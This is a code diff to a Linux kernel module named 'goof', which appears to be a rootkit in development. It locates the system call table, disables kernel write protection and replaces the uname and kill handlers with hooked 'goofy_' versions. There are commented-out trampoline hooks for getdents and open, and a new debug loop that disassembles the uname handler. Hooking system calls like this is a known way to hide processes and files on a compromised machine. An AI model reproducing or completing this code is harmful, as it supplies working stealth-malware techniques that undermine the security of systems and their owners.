@@ -408,12 +408,17 @@ goof_init(void) {
 	//Find base syscall address	
 	__sys_call_table = find(); 
 	printk("Found table\n");
-
+/*
 	//Update table with hooked code
 	//Regular way to hook syscall
 	original_uname = __sys_call_table[__NR_uname];
+
+	DISABLE_W_PROTECTED_MEMORY
 	__sys_call_table[__NR_uname] = goofy_uname;
-	printk("Hooked uname\n");
+	ENABLE_W_PROTECTED_MEMORY
+
+	printk("Hooked uname\n\n");
+
 	//Trampolining way to overwrite syscall  
 	//create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
 	//create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
@@ -421,8 +426,12 @@ goof_init(void) {
 	//Waiting on LDE+ to create these into trampoline hooks
 	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
 	original_kill = __sys_call_table[__NR_kill];
+
+	DISABLE_W_PROTECTED_MEMORY
 	__sys_call_table[__NR_kill] = goofy_kill;
-	printk("Hooked kill\n");
+	ENABLE_W_PROTECTED_MEMORY
+
+	printk("Hooked kill\n\n");
 
 	//original_open = __sys_call_table[__NR_open];
 	//__sys_call_table[__NR_open] = goofy_open;
@@ -430,31 +439,35 @@ goof_init(void) {
 	//NO - waiting on an LDE @Scott Court
 	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
 	//Creating a new trampoline - DEBUG
-	
-	printk("[goof] DEBUG\n ");
+*/	
+	printk("[goof] DEBUG\n\n ");
 	//unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_uname];
-/*	for(int i = 0; i < 32; i++){
-		MyDisasm.EIP = __sys_call_table[__NR_uname]; //(UIntPtr) ptr_tmp[i];
+	MyDisasm.EIP = __sys_call_table[__NR_uname]; //(UIntPtr) ptr_tmp[i];
+	for(int i = 0; i < 5; i++){
 		len = Disasm(&MyDisasm);
 		printk("len: %d\n", len);
-		//for(int j = 0; j < len; j++){
-		//	printk("%02x ", ptr_tmp[i+j]);
-		//}
-		//printk("\n");
+		for(int j = 0; j < len; j++){
+			printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
+		}
+		MyDisasm.EIP = MyDisasm.EIP + len;
+		
+		printk("\n");
 	}
-*/
+
 	return 0;
 }
 static void __exit
 goof_exit(void) {
 
-	remove_tramp(0);
-	remove_tramp(1);
+	//remove_tramp(0);
+	//remove_tramp(1);
 
-
+/*
+	DISABLE_W_PROTECTED_MEMORY
 	__sys_call_table[__NR_kill] = original_kill;
 	__sys_call_table[__NR_uname] = original_uname;
-	//__sys_call_table[__NR_open] = original_open;
+	ENABLE_W_PROTECTED_MEMORY
+*/	//__sys_call_table[__NR_open] = original_open;
 
 	//remove_tramp(2);
 	printk("[goof] module removed\n");
